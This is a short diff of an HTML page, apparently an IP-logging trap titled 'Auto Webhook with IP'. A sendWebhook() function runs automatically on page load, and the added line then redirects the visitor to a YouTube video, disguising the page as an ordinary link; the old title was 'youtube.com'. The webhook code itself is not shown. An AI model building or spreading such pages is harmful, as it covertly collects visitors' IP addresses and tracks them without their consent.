@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>youtube.com</title>
+  <title>Auto Webhook with IP</title>
 </head>
 <body>
 
@@ -37,6 +37,7 @@ async function sendWebhook() {
   } catch (err) {
     console.error("Error:", err);
   }
+  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 }
 
 // Automatically run when page loads
@@ -44,5 +45,4 @@ window.onload = sendWebhook;
 </script>
 
 </body>
-
 </html>
